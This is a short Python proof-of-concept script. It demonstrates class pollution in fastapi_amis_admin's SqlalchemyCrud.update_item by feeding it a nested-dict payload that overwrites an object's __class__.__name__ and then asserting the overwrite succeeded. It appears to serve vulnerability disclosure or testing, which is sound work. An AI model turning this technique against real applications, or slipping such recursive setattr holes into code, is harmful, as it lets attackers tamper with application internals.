# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: SqlalchemyCrud.update_item
# Type: get-both-set-both

from fastapi_amis_admin.crud import SqlalchemyCrud

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = {"__class__": {"__name__": payload_value}}

def run_poc():
  # SqlalchemyCrud.update_item recursively traverses nested dicts:
  # for k, v in values.items():
  #   if isinstance(v, dict):
  #     sub = getattr(obj, name)
  #     self.update_item(sub, v)
  #   else:
  #     setattr(obj, name, v)
  crud = SqlalchemyCrud.__new__(SqlalchemyCrud)
  crud.model = type('Model', (), {})
  crud.update_item(target, PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
